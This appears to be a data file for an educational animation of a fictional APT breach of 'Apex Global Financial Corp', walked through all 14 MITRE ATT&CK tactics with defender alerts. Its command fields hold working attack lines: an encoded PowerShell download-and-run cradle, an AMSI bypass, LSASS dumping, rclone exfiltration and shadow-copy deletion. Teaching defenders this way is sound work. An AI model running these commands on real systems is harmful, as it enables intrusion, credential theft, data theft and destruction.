// Campaign Storytelling Data: "Operation Apex Dawn"
// Chronological 14-Act Animated Adversary Intrusion across all MITRE ATT&CK Tactics

export const CAMPAIGN_STORY = {
  title: "Operation Apex Dawn",
  subtitle: "The Anatomy of an Advanced Persistent Threat (APT) Infiltration",
  targetCompany: "Apex Global Financial Corp",
  threatActor: "PHANTOM HYDRA (APT-94)",
  description: "Experience the step-by-step reality of an enterprise cyber breach. Follow how an adversary progresses through all 14 MITRE ATT&CK tactics—from initial reconnaissance to devastating ransomware impact—and see how modern defenders detect and respond at each critical juncture.",

  // Network topology nodes for interactive canvas rendering
  nodes: [
    { id: "attacker", label: "Phantom Hydra C2", role: "Attacker Infrastructure", icon: "skull", x: 80, y: 160, type: "adversary", status: "active" },
    { id: "darkweb", label: "Dark Web / Staging", role: "Offshore VPS / Registrar", icon: "globe", x: 80, y: 340, type: "adversary", status: "active" },
    { id: "firewall", label: "Perimeter Firewall", role: "Edge Gateway / WAF", icon: "shield", x: 280, y: 250, type: "perimeter", status: "secure" },
    { id: "workstation", label: "HR Laptop (PC-04)", role: "Internal Endpoint", icon: "laptop", x: 480, y: 150, type: "internal", status: "secure" },
    { id: "jumpbox", label: "IT Jump Host", role: "Admin Jump Box", icon: "terminal", x: 480, y: 350, type: "internal", status: "secure" },
    { id: "domainController", label: "Domain Controller (DC-01)", role: "Active Directory Forest", icon: "server", x: 700, y: 150, type: "crown_jewel", status: "secure" },
    { id: "database", label: "Financial DB (DB-01)", role: "Core Customer Data", icon: "database", x: 700, y: 350, type: "crown_jewel", status: "secure" },
    { id: "exfilCloud", label: "Drop Cloud Repo", role: "Stolen Data Cloud Vault", icon: "cloud", x: 890, y: 250, type: "exfil", status: "dormant" }
  ],

  // All 14 Acts representing the 14 MITRE Tactics
  acts: [
    {
      actNumber: 1,
      tacticId: "TA0043",
      tacticName: "Reconnaissance",
      techniqueId: "T1595",
      techniqueName: "Active Scanning",
      chapterTitle: "Act I: In The Shadows - Mapping the Target",
      storyNarrative: "The threat group 'Phantom Hydra' begins casing Apex Global Financial Corp. They don't touch the internal network yet. Instead, automated scanners probe the company's public IP range, discovering an internet-facing SSL-VPN portal with outdated firmware, while scraping LinkedIn for employee email patterns.",
      analogyBadge: "The Burglar Casing The House",
      analogyText: "Before breaking in, the burglar sits in a car across the street for days, taking notes on the lock types, security camera angles, and when the occupants arrive home.",
      attackerPerspective: "We discovered an unpatched VPN portal at 198.51.100.24 and compiled a target list of 40 HR and Finance employee emails.",
      defenderPerspective: "Perimeter firewall logs periodic SYN scans from overseas bulletproof subnets. Low-severity alert logged, but no active intrusion detected.",
      commandExecuted: "nmap -sS -sV -T4 -p 80,443,8443,10443 vpn.apex-global.com\ntheHarvester -d apex-global.com -b linkedin,google",
      commandCaption: "Scanning the company's public internet address for open doors (ports), and harvesting employee emails from LinkedIn — all without touching the internal network.",
      activeNodes: ["attacker", "firewall"],
      packetFlow: { from: "attacker", to: "firewall", type: "scan", label: "SYN Probe (Port 443)", speed: 1.2 },
      nodeStatusUpdates: {
        firewall: "probed"
      },
      socTelemetry: {
        severity: "LOW",
        eventCode: "FW-SCAN-DETECT",
        message: "Perimeter WAF detected TCP SYN probe sweeping external ports 80-10443 from 185.220.101.5.",
        recommendedAction: "Add scanning CIDR to temporary perimeter drop list; audit internet-exposed asset patch status."
      }
    },
    {
      actNumber: 2,
      tacticId: "TA0042",
      tacticName: "Resource Development",
      techniqueId: "T1583",
      techniqueName: "Acquire Infrastructure",
      chapterTitle: "Act II: The Workshop - Weaponizing Assets",
      storyNarrative: "Phantom Hydra sets up their attack infrastructure. They purchase lookalike typosquat domain 'apex-secure-portal.com', configure free Let's Encrypt SSL certificates to look authentic, rent bulletproof offshore VPS servers, and package a customized Cobalt Strike payload hidden inside an ISO disk image.",
      analogyBadge: "Forging The Fake Badge & Van",
      analogyText: "The burglar prints counterfeit delivery company ID badges, buys burner phones with cash, and rents an unmarked van with fake license plates.",
      attackerPerspective: "Infrastructure is live. Domain apex-secure-portal.com has 100% reputation score and valid SSL. Payload is compiled and bypasses static AV.",
      defenderPerspective: "Threat Intelligence feed flags registration of newly registered domain matching corporate brand name. Added to monitoring watchlist.",
      commandExecuted: "curl -X POST https://api.registrar.com/register -d domain=apex-secure-portal.com\nbuild_beacon.sh --profile apex_telemetry --format iso",
      commandCaption: "Registering a fake domain that looks like the real company, and packaging the malware into an ISO disk image to evade email security filters.",
      activeNodes: ["attacker", "darkweb"],
      packetFlow: { from: "attacker", to: "darkweb", type: "deploy", label: "Staging Payload & VPS", speed: 1.0 },
      nodeStatusUpdates: {
        darkweb: "weaponized"
      },
      socTelemetry: {
        severity: "INFO",
        eventCode: "TI-NRD-ALERT",
        message: "Threat Intel feed alert: Newly Registered Domain (NRD) 'apex-secure-portal.com' detected matching brand keywords.",
        recommendedAction: "Preemptively block outbound DNS resolution to apex-secure-portal.com on Secure Web Gateway."
      }
    },
    {
      actNumber: 3,
      tacticId: "TA0001",
      tacticName: "Initial Access",
      techniqueId: "T1566",
      techniqueName: "Phishing (Spearphishing Attachment)",
      chapterTitle: "Act III: The Trojan Delivery - Breaching The Perimeter",
      storyNarrative: "A targeted spearphishing email lands in the inbox of Sarah Jenkins, Senior HR Recruiter. The email appears to come from executive leadership: 'Confidential_Executive_Comp_2026.pdf.iso'. Unaware, Sarah opens the attachment, which Windows mounts as a virtual CD drive.",
      analogyBadge: "Buzzing The Delivery Person In",
      analogyText: "The burglar rings the secure front desk intercom wearing a delivery uniform, claiming to have an urgent signature parcel for the executive.",
      attackerPerspective: "Target opened the email and mounted the ISO container. Waiting for user interaction with the disguised shortcut.",
      defenderPerspective: "Email gateway scanned the message; bypassed basic heuristics because the ISO contained no plain EXE file, only a nested shortcut.",
      commandExecuted: "sendmail -t s.jenkins@apex-global.com -f exec-office@apex-secure-portal.com \\\n  -s 'Confidential Executive Compensation 2026' -a 'Comp_2026.iso'",
      commandCaption: "Sending a fake email disguised as coming from company leadership, with a malicious ISO file attached — designed to trick the recipient into opening it.",
      activeNodes: ["attacker", "firewall", "workstation"],
      packetFlow: { from: "darkweb", to: "workstation", type: "phish", label: "Spearphish ISO Delivery", speed: 1.4 },
      nodeStatusUpdates: {
        workstation: "targeted"
      },
      socTelemetry: {
        severity: "MEDIUM",
        eventCode: "SEG-ATTACH-PASS",
        message: "Inbound email to HR user contained ISO attachment. File reputation neutral; delivered to user mailbox.",
        recommendedAction: "Block direct mounting of ISO and VHD file extensions via Group Policy."
      }
    },
    {
      actNumber: 4,
      tacticId: "TA0002",
      tacticName: "Execution",
      techniqueId: "T1059",
      techniqueName: "Command and Scripting Interpreter (PowerShell)",
      chapterTitle: "Act IV: The Spark - Code Takes Life",
      storyNarrative: "Sarah double-clicks the PDF-icon shortcut. Windows executes a hidden LNK command that spawns PowerShell with hidden parameters. The script connects to the attacker's staging server and executes Cobalt Strike shellcode directly in RAM without writing an EXE to disk.",
      analogyBadge: "Turning The Power Drill On",
      analogyText: "Once inside the foyer, the burglar pulls out the power drill and begins working on the interior security door lock.",
      attackerPerspective: "Stage-1 beacon executed successfully in memory! We have an interactive beacon session on PC-04 under user APEX\\sjenkins.",
      defenderPerspective: "Sysmon Event ID 1: powershell.exe spawned by explorer.exe with `-W Hidden -Enc` arguments. EDR agent raises alert.",
      commandExecuted: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBhAHAAZQB4AC0AcwBlAGMAdQByAGUALQBwAG8AcgB0AGEAbAAuAGMAbwBtAC8AYgAnACkA",
      commandCaption: "Running a hidden PowerShell script (the long gibberish string is Base64-encoded to hide its contents) that downloads and executes malware entirely in RAM — no file is written to disk.",
      activeNodes: ["workstation"],
      packetFlow: { from: "darkweb", to: "workstation", type: "shellcode", label: "Reflective Shellcode in RAM", speed: 1.5 },
      nodeStatusUpdates: {
        workstation: "compromised"
      },
      socTelemetry: {
        severity: "HIGH",
        eventCode: "EDR-PROC-SUSP",
        message: "Endpoint alert on PC-04: explorer.exe spawned PowerShell with encoded command-line parameters.",
        recommendedAction: "Isolate PC-04 from the corporate network immediately and capture volatile memory dump."
      }
    },
    {
      actNumber: 5,
      tacticId: "TA0003",
      tacticName: "Persistence",
      techniqueId: "T1053",
      techniqueName: "Scheduled Task",
      chapterTitle: "Act V: The Anchor - Securing The Foothold",
      storyNarrative: "If Sarah restarts her computer at 5 PM, the attacker could lose their connection. To prevent this, the adversary installs a persistent scheduled task disguised as 'MicrosoftEdgeUpdateTaskUA', programmed to re-launch the beacon every 45 minutes as an autostart job.",
      analogyBadge: "Unlatching The Back Window",
      analogyText: "The burglar quietly unlocks a back basement window and wedges it with a pebble so they can climb back in whenever they want.",
      attackerPerspective: "Persistence established. Even if the system reboots or the user logs off, our beacon will re-spawn every 45 minutes.",
      defenderPerspective: "Security Event Log Event ID 4698: A scheduled task was created by a non-admin account pointing to user ProgramData directory.",
      commandExecuted: 'schtasks /create /tn "MicrosoftEdgeUpdateTaskUA" \\\n  /tr "C:\\ProgramData\\edge_updater.exe" /sc HOURLY /mo 1 /f',
      commandCaption: "Creating a disguised Windows scheduled task that automatically restarts the malware every hour — even after a reboot — so the attacker can't be locked out.",
      activeNodes: ["workstation"],
      // Fix: was a self-loop (workstation→workstation) which rendered as a
      // stationary particle. Rerouted to firewall to show the beacon "calling home"
      // — visually meaningful and not a no-op animation.
      packetFlow: { from: "workstation", to: "firewall", type: "task", label: "Beacon Keepalive (Scheduled Task)", speed: 0.8 },
      nodeStatusUpdates: {
        workstation: "persisted"
      },
      socTelemetry: {
        severity: "MEDIUM",
        eventCode: "WIN-SEC-4698",
        message: "New scheduled task 'MicrosoftEdgeUpdateTaskUA' registered on PC-04 with target in non-standard directory.",
        recommendedAction: "Verify task hash against Microsoft Edge signatures; inspect scheduled task creation lineage."
      }
    },
    {
      actNumber: 6,
      tacticId: "TA0004",
      tacticName: "Privilege Escalation",
      techniqueId: "T1055",
      techniqueName: "Process Injection (Process Hollowing)",
      chapterTitle: "Act VI: The Promotion - Seizing Master Keys",
      storyNarrative: "Standard HR privileges cannot access server rooms or security logs. The adversary leverages a Windows User Account Control (UAC) bypass and injects malicious shellcode into `spoolsv.exe` (Print Spooler), elevating their token to NT AUTHORITY\\SYSTEM.",
      analogyBadge: "Stealing The Building Manager Keyring",
      analogyText: "Finding the building manager's master keyring in an unattended office, allowing entry into every locked room in the complex.",
      attackerPerspective: "Elevated successfully to NT AUTHORITY\\SYSTEM. We now have full kernel-level permissions on the local machine.",
      defenderPerspective: "EDR detects Sysmon Event ID 8: CreateRemoteThread called into spoolsv.exe with unbacked memory allocation.",
      commandExecuted: "Invoke-ReflectivePEInjection -ProcessId (Get-Process spoolsv).Id \\\n  -PEPath C:\\ProgramData\\elevate.dll",
      commandCaption: "Injecting malicious code into the Windows Print Spooler process, which already runs with SYSTEM (highest) privileges — so the attacker inherits those admin rights.",
      activeNodes: ["workstation"],
      packetFlow: { from: "workstation", to: "workstation", type: "inject", label: "Injection into spoolsv.exe (SYSTEM)", speed: 1.6 },
      nodeStatusUpdates: {
        workstation: "elevated"
      },
      socTelemetry: {
        severity: "HIGH",
        eventCode: "EDR-INJECT-DETECT",
        message: "Process Injection alert: Unsigned memory region injected into spoolsv.exe PID 1840 on PC-04.",
        recommendedAction: "Terminate injected process thread, enforce Exploit Guard Arbitrary Code Guard (ACG)."
      }
    },
    {
      actNumber: 7,
      tacticId: "TA0005",
      tacticName: "Defense Evasion",
      techniqueId: "T1070",
      techniqueName: "Indicator Removal (Clear Event Logs)",
      chapterTitle: "Act VII: The Smoke Screen - Erasing The Trail",
      storyNarrative: "Knowing defenders analyze event logs, the attacker patches the Antimalware Scan Interface (AMSI) in memory to blind antivirus, and executes `wevtutil cl Security` to wipe the Windows Security event log on the compromised workstation.",
      analogyBadge: "Spraying Paint Over Security Cameras",
      analogyText: "The burglar sprays black spray paint directly over the security camera lenses and wipes their fingerprints off the door handles.",
      attackerPerspective: "AMSI neutralized in memory. Local security event log cleared. Defenses blinded on this endpoint.",
      defenderPerspective: "SIEM triggers CRITICAL alert: Windows Event ID 1102 (The audit log was cleared). SIEM received the event before the local log was wiped!",
      commandExecuted: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\nwevtutil cl Security",
      commandCaption: "First disabling Windows' malware-detection interface (AMSI) so antivirus goes blind, then wiping the Security event log to destroy all evidence of what they've done.",
      activeNodes: ["workstation"],
      packetFlow: { from: "workstation", to: "workstation", type: "evade", label: "Wiping Security Event Logs", speed: 1.0 },
      nodeStatusUpdates: {
        workstation: "blinded"
      },
      socTelemetry: {
        severity: "CRITICAL",
        eventCode: "WIN-SEC-1102",
        message: "CRITICAL ALERT: Windows Security audit log was cleared by Administrator on PC-04.",
        recommendedAction: "Immediate SOAR automated host isolation; dispatch incident response team to workstation."
      }
    },
    {
      actNumber: 8,
      tacticId: "TA0006",
      tacticName: "Credential Access",
      techniqueId: "T1003",
      techniqueName: "OS Credential Dumping (LSASS Memory)",
      chapterTitle: "Act VIII: The Vault Combination - Harvesting Credentials",
      storyNarrative: "Now running as SYSTEM, the adversary targets the Local Security Authority Subsystem Service (LSASS). They dump memory from `lsass.exe`, extracting cached NTLM password hashes—including the credentials of a Domain Administrator who logged in earlier to troubleshoot a printer.",
      analogyBadge: "Cracking The Office Safe",
      analogyText: "Opening the office safe and copying down all executive passcodes, master keys, and combination locks.",
      attackerPerspective: "Jackpot! Extracted NTLM hash for 'APEX\\svc-domain-admin': e59c7... and plaintext Kerberos tickets.",
      defenderPerspective: "EDR LSASS memory protection rule trips: Process Access Mask 0x1010 (PROCESS_VM_READ) requested for lsass.exe.",
      commandExecuted: "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\\n  C:\\Temp\\lsass.dmp full",
      commandCaption: "Dumping the memory of the LSASS process — Windows' password vault — to a file so it can be analysed offline to extract administrator passwords and authentication tokens.",
      activeNodes: ["workstation"],
      packetFlow: { from: "workstation", to: "workstation", type: "creds", label: "LSASS Memory Dump -> Hashes", speed: 1.4 },
      nodeStatusUpdates: {
        workstation: "harvested"
      },
      socTelemetry: {
        severity: "CRITICAL",
        eventCode: "EDR-LSASS-DUMP",
        message: "LSASS Access Violation: Unauthorized process attempted to read memory of lsass.exe on PC-04.",
        recommendedAction: "Force domain-wide password reset for accounts logged onto PC-04; activate Credential Guard."
      }
    },
    {
      actNumber: 9,
      tacticId: "TA0007",
      tacticName: "Discovery",
      techniqueId: "T1087",
      techniqueName: "Account Discovery / Network Mapping",
      chapterTitle: "Act IX: The Floorplan - Charting The Enterprise",
      storyNarrative: "The attacker now needs to find where Apex Global keeps its crown jewels. They run native built-in commands (`net group 'Domain Admins' /domain`, `nltest /dclist`, and LDAP queries), discovering the primary Domain Controller (DC-01) and Financial Database Server (DB-01).",
      analogyBadge: "Reading The Building Blueprint",
      analogyText: "The burglar unrolls the architect blueprints to find the exact location of the master vault, database room, and security guard station.",
      attackerPerspective: "Identified Domain Controller at 10.0.1.10 (DC-01) and Financial Oracle DB at 10.0.2.50 (DB-01). Path to crown jewels is clear.",
      defenderPerspective: "Active Directory Honey-Account receives an unauthorized LDAP query from PC-04. Suspicious reconnaissance flagged.",
      commandExecuted: "nltest /dclist:apex.local\nnet group \"Domain Admins\" /domain\nnet view /all",
      commandCaption: "Using built-in Windows commands (no malware needed) to list every Domain Controller and Domain Admin account — the equivalent of finding the building's master key locations.",
      activeNodes: ["workstation", "domainController", "database"],
      packetFlow: { from: "workstation", to: "domainController", type: "recon", label: "Active Directory LDAP Enumeration", speed: 1.3 },
      nodeStatusUpdates: {
        domainController: "discovered",
        database: "discovered"
      },
      socTelemetry: {
        severity: "MEDIUM",
        eventCode: "AD-HONEY-PROBE",
        message: "Anomalous mass LDAP enumeration observed from standard workstation PC-04 querying Domain Admins group.",
        recommendedAction: "Audit LDAP query rate; verify if PC-04 is running administrative tools."
      }
    },
    {
      actNumber: 10,
      tacticId: "TA0008",
      tacticName: "Lateral Movement",
      techniqueId: "T1021",
      techniqueName: "Remote Services (SMB / Pass-The-Hash)",
      chapterTitle: "Act X: The Leap - Traversing The Corridors",
      storyNarrative: "The adversary doesn't need to crack the Domain Admin password. Using Pass-the-Hash (PtH) over SMB and WMI, they reuse the stolen NTLM hash to authenticate straight into Domain Controller (DC-01) and the Financial Database (DB-01), leaping across network segments.",
      analogyBadge: "Walking Down The Hall With Master Keys",
      analogyText: "Swiping the stolen master card key through the hallway badge readers, unlocking the executive elevators and server room doors.",
      attackerPerspective: "Pivoted successfully! We now possess active SYSTEM shells on both Domain Controller (DC-01) and DB-01.",
      defenderPerspective: "Windows Security Event ID 4624 (Logon Type 3) using NTLM authentication to DC-01 originating from an unprivileged workstation IP.",
      commandExecuted: "Invoke-WmiMethod -Class Win32_Process -Name Create \\\n  -ArgumentList 'cmd.exe /c C:\\Temp\\agent.exe' -ComputerName '10.0.1.10'",
      commandCaption: "Using the stolen password hash (no need to crack it) to log into the Domain Controller and run a command remotely — like using a copied keycard on a door.",
      activeNodes: ["workstation", "domainController", "database"],
      packetFlow: { from: "workstation", to: "database", type: "lateral", label: "Pass-The-Hash SMB Pivot (Port 445)", speed: 1.5 },
      nodeStatusUpdates: {
        domainController: "compromised",
        database: "compromised"
      },
      socTelemetry: {
        severity: "CRITICAL",
        eventCode: "WIN-SEC-4624-NTLM",
        message: "Lateral movement alert: NTLM network authentication to DC-01 from workstation PC-04 using Domain Admin account.",
        recommendedAction: "Sever SMB session; isolate DC-01 and DB-01 from non-management VLANs; force Kerberos-only auth."
      }
    },
    {
      actNumber: 11,
      tacticId: "TA0009",
      tacticName: "Collection",
      techniqueId: "T1560",
      techniqueName: "Archive Collected Data",
      chapterTitle: "Act XI: The Loot - Bagging The Gold",
      storyNarrative: "On Financial Database DB-01, the adversary accesses customer transactions, Wire transfer logs, and confidential client SSNs. They run a command-line 7-Zip script to bundle and encrypt 45 GB of sensitive data into a password-protected multi-part archive `apex_vault.7z`.",
      analogyBadge: "Packing The Stolen Jewels Into Duffle Bags",
      analogyText: "The burglar shovels diamond rings, bullion bars, and bearer bonds into heavy canvas duffle bags and zips them tight.",
      attackerPerspective: "45 GB of customer financial records staged and encrypted with AES-256 in C:\\Temp\\apex_vault.7z. Ready for extraction.",
      defenderPerspective: "File Integrity Monitoring (FIM) detects rapid bulk read operations across the Financial Records volume outside business hours.",
      commandExecuted: "7z.exe a -tzip -pApexExtortionKey2026 -mhe=on -r \\\n  C:\\Temp\\apex_vault.7z D:\\Apex_Customer_Records\\*",
      commandCaption: "Compressing and password-encrypting 45 GB of customer records into a zip archive — ready to be smuggled out. The encryption means defenders can't read it if they intercept the transfer.",
      activeNodes: ["database"],
      packetFlow: { from: "database", to: "database", type: "archive", label: "AES-256 Staging Archive (45 GB)", speed: 1.1 },
      nodeStatusUpdates: {
        database: "staged"
      },
      socTelemetry: {
        severity: "HIGH",
        eventCode: "DLP-BULK-READ",
        message: "Data Loss Prevention alert: 7z.exe executed with password switch compressing 45,000 sensitive customer records.",
        recommendedAction: "Terminate 7z.exe process tree, freeze database staging directory, trigger data breach incident protocol."
      }
    },
    {
      actNumber: 12,
      tacticId: "TA0011",
      tacticName: "Command and Control",
      techniqueId: "T1071",
      techniqueName: "Application Layer Protocol (Encrypted HTTPS)",
      chapterTitle: "Act XII: The Ghost Wire - Covert Communications",
      storyNarrative: "The adversary synchronizes all compromised hosts to a resilient, high-speed C2 channel. Beacons mimic ordinary Microsoft Azure CDN telemetry traffic over HTTPS, using sleep jitter and TLS 1.3 to blend indistinguishably into standard business web traffic.",
      analogyBadge: "Encrypted Walkie-Talkies",
      analogyText: "The burglar switches to frequency-hopping encrypted walkie-talkies that sound like harmless radio static to eavesdroppers.",
      attackerPerspective: "C2 channel stable. Beacons routing commands across DC-01 and DB-01 with 30-second randomized jitter.",
      defenderPerspective: "Proxy logs show regular HTTPS POST beacons to newly created CDN endpoint with consistent JA4 TLS fingerprint.",
      commandExecuted: "beacon.exe --c2 https://cdn-azure-sync.net:443 --jitter 30 --sleep 45 --profile malleable_office",
      commandCaption: "Starting an encrypted communication channel to the attacker's server disguised as normal Microsoft Azure traffic — so network monitoring tools can't tell it apart from legitimate business traffic.",
      activeNodes: ["database", "attacker"],
      packetFlow: { from: "database", to: "attacker", type: "c2", label: "Covert HTTPS C2 Beacon (Port 443)", speed: 1.3 },
      nodeStatusUpdates: {
        attacker: "c2_connected"
      },
      socTelemetry: {
        severity: "HIGH",
        eventCode: "NDR-BEACON-ALERT",
        message: "Network Detection & Response (NDR): Jittered HTTPS periodic heartbeats detected from DB-01 to unclassified external IP.",
        recommendedAction: "Sinkhole destination domain cdn-azure-sync.net; inspect TLS session decrypt logs."
      }
    },
    {
      actNumber: 13,
      tacticId: "TA0010",
      tacticName: "Exfiltration",
      techniqueId: "T1048",
      techniqueName: "Exfiltration Over Alternative Protocol (Cloud Storage)",
      chapterTitle: "Act XIII: The Heist - Smuggling The Prize",
      storyNarrative: "The adversary executes Rclone from DB-01, uploading the 45 GB encrypted archive to an anonymous cloud storage bucket. To avoid tripping bandwidth alarms, they throttle outbound transfer speed to 15 MB/s, silently siphoning the organization's most sensitive data out the door.",
      analogyBadge: "Loading The Getaway Van",
      analogyText: "The burglar tosses the duffle bags through the rear van doors and speeds away down the alley into traffic.",
      attackerPerspective: "Exfiltration complete. 45 GB of customer data safely stored in our private cloud vault. Double extortion leverage secured.",
      defenderPerspective: "Cloud Access Security Broker (CASB) trips on anomalous outbound data volume: 45 GB egressed to unsanctioned cloud storage endpoint.",
      commandExecuted: "rclone.exe copy C:\\Temp\\apex_vault.7z remote:stealth-cloud-bucket \\\n  --bwlimit 15M --transfers 4",
      commandCaption: "Uploading the stolen 45 GB archive to the attacker's anonymous cloud storage, throttled to 15 MB/s to avoid triggering bandwidth anomaly alarms.",
      activeNodes: ["database", "exfilCloud"],
      packetFlow: { from: "database", to: "exfilCloud", type: "exfil", label: "Exfiltrating 45 GB Encrypted Archive", speed: 1.8 },
      nodeStatusUpdates: {
        database: "exfiltrated",
        exfilCloud: "stolen_data"
      },
      socTelemetry: {
        severity: "CRITICAL",
        eventCode: "CASB-MASS-EGRESS",
        message: "CRITICAL CASB ALERT: 45 GB data egress to unsanctioned cloud destination within 45 minutes from DB-01.",
        recommendedAction: "Sever outbound internet routing on server VLAN; revoke cloud API tokens; alert executive leadership."
      }
    },
    {
      actNumber: 14,
      tacticId: "TA0040",
      tacticName: "Impact",
      techniqueId: "T1486",
      techniqueName: "Data Encrypted for Impact (Ransomware)",
      chapterTitle: "Act XIV: The Inferno - Total Catastrophe",
      storyNarrative: "The final blow: With the data already stolen, Phantom Hydra deploys ransomware enterprise-wide via Active Directory Group Policy. They delete Volume Shadow Copies to stop recovery, terminate database services, and encrypt all servers. Workstation screens turn crimson with a $15 Million ransom demand.",
      analogyBadge: "Blowing Up The Building",
      analogyText: "Having stolen the gold, the burglar detonates explosives to destroy the bank vaults and leave behind a giant extortion note.",
      attackerPerspective: "Network successfully locked. All database tables and shadow copies obliterated. Ransom note 'APEX_RECOVERY_README.txt' dropped.",
      defenderPerspective: "SOAR triggers enterprise lockdown: Host isolation active. Incident response war room declared. Crisis management team mobilized.",
      commandExecuted: "vssadmin.exe delete shadows /all /quiet\nnet stop MSSQLSERVER && net stop VeeamBackupSvc\nransomware.exe --encrypt-network --extension .locked --drop-note",
      commandCaption: "First deleting all Windows backup snapshots (so recovery is impossible), then shutting down the database and backup services, then encrypting every file across the entire network with ransomware.",
      activeNodes: ["domainController", "database", "workstation"],
      packetFlow: { from: "domainController", to: "workstation", type: "impact", label: "GPO Ransomware Detonation (.locked)", speed: 2.0 },
      nodeStatusUpdates: {
        workstation: "encrypted",
        domainController: "encrypted",
        database: "encrypted"
      },
      socTelemetry: {
        severity: "EMERGENCY",
        eventCode: "RANSOMWARE-DETONATE",
        message: "EMERGENCY: Rapid high-entropy mass file encryption and VSS shadow copy deletion across entire domain.",
        recommendedAction: "Execute Disaster Recovery Playbook: Cut external links, restore from immutable air-gapped backups."
      }
    }
  ]
};
